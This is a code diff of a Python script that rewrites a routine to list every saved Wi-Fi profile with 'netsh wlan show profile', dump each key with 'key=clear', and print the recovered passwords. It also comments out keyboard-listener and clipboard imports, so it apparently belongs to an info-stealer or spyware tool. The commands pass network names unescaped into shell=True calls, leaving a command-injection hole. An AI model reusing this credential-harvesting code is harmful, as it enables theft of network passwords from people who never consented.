@@ -1,10 +1,10 @@
 import socket
 import sys
 import platform
-import pyperclip
+#import pyperclip
 import subprocess
 import re
-from pynput import keyboard
+#from pynput import keyboard
 from requests import get
 
 '''
@@ -55,17 +55,23 @@ def getClipboardInfo():
         print('Clipboard could not be copied')
 '''
 
-command = "netsh wlan show profile"
+def getWifiInfo():
+    command = "netsh wlan show profile"
 
-try:
-    networks = subprocess.check_output(command, shell=True)
-    network_names_list = re.findall("(?:Profile\s*:\s)(.*)", networks)
+    networks = subprocess.check_output(command, shell=True).decode('cp1252')
+    network_names_list = re.findall("(?<=: )[^\n]+", networks)
+    network_names_list = [i.strip() for i in network_names_list]
 
     result = ""
     for network_name in network_names_list:
-        command = "netsh wlan show profile " + network_name + " key=clear"
-        current_result = subprocess.check_output(command, shell=True)
-        result = result + current_result
-        print(result)
-except:
-    print("Cannot get informations about this computer wifi history")
+        try:
+            command = "netsh wlan show profile " + network_name + " key=clear"
+            current_result = subprocess.check_output(command, shell=True).decode('cp1252')
+            key_content = re.findall("(?<=Contenu de la cl‚            : )[^\n]+", current_result)
+            result += (key_content[0] + '\n')
+        except:
+            continue
+    return(result)
+
+print(getWifiInfo())
+
